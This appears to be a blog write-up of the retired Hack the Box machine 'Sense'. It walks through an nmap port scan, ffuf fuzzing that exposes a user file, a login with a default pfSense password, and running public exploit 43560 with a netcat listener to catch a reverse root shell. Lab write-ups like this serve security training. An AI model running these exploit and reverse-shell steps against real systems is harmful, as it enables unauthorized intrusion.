---
layout: post
title: Hack the Box - Sense
date: 2020-06-13 17:39:22 +0100
description: Sense, while not requiring many steps to complete, can be challenging for some as the proof of concept exploit that is publicly available is very unreliable. An alternate method using the same vulnerability is required to successfully gain access
img: sense.png
fig-caption: Sense
categories: HackTheBox
tags: [Easy, FreeBSD, Retired, CVE]
---
## Overview
Sense, while not requiring many steps to complete, can be challenging for some as the proof of concept exploit that is publicly available is very unreliable. An alternate method using the same vulnerability is required to successfully gain access
## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/sense]
└─$ sudo nmap -p- -T4 10.129.113.234                          
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 17:47 GMT
Nmap scan report for 10.129.113.234
Host is up (0.016s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 88.10 seconds
```
From the initial port scan we can see that only the http/https ports are open. When going to that port in a browser we are greeted with a login page for PFSense. The default credentials however do not work. After some poking around I found a fuzzing search for text files found 2 interesting files, one of which contains a username. When trying the default password, it granted access.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/sense]
└─$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://10.129.113.234/FUZZ.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : https://10.129.113.234/FUZZ.txt
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

changelog               [Status: 200, Size: 271, Words: 35, Lines: 10]
system-users            [Status: 200, Size: 106, Words: 9, Lines: 7]
:: Progress: [220547/220547] :: Job [1/1] :: 2389 req/sec :: Duration: [0:02:05] :: Errors: 0 ::
```
## Foothold
Once authenticated I looked through exploitdb, after validating I had the correct permissions to access the resource the exploit relied on I was able to execute it and receive the shell. [43560](https://www.exploit-db.com/exploits/43560)
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/sense]
└─$ python3 43560.py --rhost 10.129.113.234 --lhost 10.10.14.27 --lport 4257 --username rohit --password pfsense
CSRF token obtained
Running exploit...
Exploit completed
```
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/sense]
└─$ nc -nlvp 4257
listening on [any] 4257 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.113.234] 39362
sh: can't access tty; job control turned off
# whoami
root
```
## Privilege Escalation
As the exploit returned a root shell there is no need for privilege escalation

